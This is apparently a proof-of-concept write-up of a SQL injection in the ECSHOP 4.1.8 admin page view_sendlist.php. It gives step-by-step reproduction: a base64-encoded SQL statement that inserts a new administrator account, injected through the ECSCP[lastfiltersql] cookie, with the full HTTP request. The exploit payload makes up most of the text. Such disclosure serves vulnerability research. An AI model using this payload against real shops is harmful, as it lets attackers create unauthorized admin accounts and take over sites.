# ecshop

ECSHOP, 4.1.8, SQL Injection

Vulnerabilities Reproduction:

1. Log in to the backend, visit the view_ sendlist.php, and then capture the packet.

2. Enter the SQL statement to be executed, and then convert it into base64 encoding. Here we take adding the test administrator user as an example.
   
<img width="415" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/235fd585-510c-48a4-b749-163d3765b972">

Here is the base64 encoding.
aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=

3. Get the value of ECSCP[lastfilterfile], here is F8F2F4EC.

4. Send the request package, and replace the previous cookie, or  just add the following string to the original cookie.
act=query&uselastfilter=1
ECSCP[lastfiltersql]=aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=;ECSCP[lastfilterfile]=F8F2F4EC;
Successfully executed SQL statement.

GET /ECShop_V4.1.13/ECShop/source/ecshop/admin/view_sendlist.php?act=query&uselastfilter=1 HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: loginNum=4; ECS_LastCheckOrder=Wed%2C%2011%20Jan%202023%2014%3A38%3A48%20GMT; ECS[visit_times]=13; Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1672820048; PHPSESSID=c80bf1de9332905dbf330e4fc2929cc4; JSESSIONID=7BAE8239C62E8C6B4AC401F85773ACED; ECSCP_ID=d9c053c22fb93a4801ea199b40025da9ec8286d3;ECSCP[lastfiltersql]=aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=;ECSCP[lastfilterfile]=F8F2F4EC;
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

<img width="484" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/165d612d-27e7-4d54-9ac8-0e4cac2e9b68">

<img width="489" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/43846d1c-9192-415f-a0fa-9335f730d9e2">


4. Refresh the database and find that the user is successfully added, or the logged-in user finds that he can also log in successfully.
   <img width="752" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/f4c894ca-e513-4499-b0a1-ee64c01dac15">

 

